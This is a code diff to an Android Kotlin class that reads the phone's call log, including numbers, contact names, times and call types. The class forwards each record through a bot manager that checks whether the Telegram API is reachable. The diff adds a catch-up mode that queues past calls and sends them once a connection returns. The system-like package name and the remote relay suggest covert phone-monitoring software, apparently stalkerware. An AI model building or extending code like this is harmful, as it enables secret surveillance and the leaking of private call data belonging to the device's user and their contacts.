@@ -86,6 +86,10 @@ class CallMonitor(
                             prefsManager.callLastProcessedId = cursor.getLong(idIdx)
                         }
                     }
+                } else {
+                    monitorScope.launch {
+                        processLatestCall(isCatchUp = true)
+                    }
                 }
             } catch (e: Exception) {
                 // Fallback — will process from current state
@@ -116,7 +120,7 @@ class CallMonitor(
         }
     }
 
-    private suspend fun processLatestCall() {
+    private suspend fun processLatestCall(isCatchUp: Boolean = false) {
         processMutex.withLock {
         val uri = CallLog.Calls.CONTENT_URI
         val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME)
@@ -157,15 +161,25 @@ class CallMonitor(
                         typeStr, timeStr, safeContactName, safeNumber
                     )
 
-                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
-                        context, output, "call_alrt", "offline_calls.txt", onUpdate
-                    )
-                    LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Processed $typeStr call from $contactName")
-                    delay(3000)
+                    if (isCatchUp) {
+                        com.system.superiormonitor.bot.OfflineManager.queueOnly(
+                            context, output, "call_alrt", "offline_calls.txt"
+                        )
+                        LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Queued $typeStr call from $contactName")
+                    } else {
+                        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+                            context, output, "call_alrt", "offline_calls.txt", onUpdate
+                        )
+                        LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Processed $typeStr call from $contactName")
+                        delay(3000)
+                    }
 
                     if (id > prefsManager.callLastProcessedId) {
                         prefsManager.callLastProcessedId = id
                     }
+                }
+                if (isCatchUp && com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
+                    com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(context, CoroutineScope(Dispatchers.IO))
                 }
             }
         } catch (e: SecurityException) {
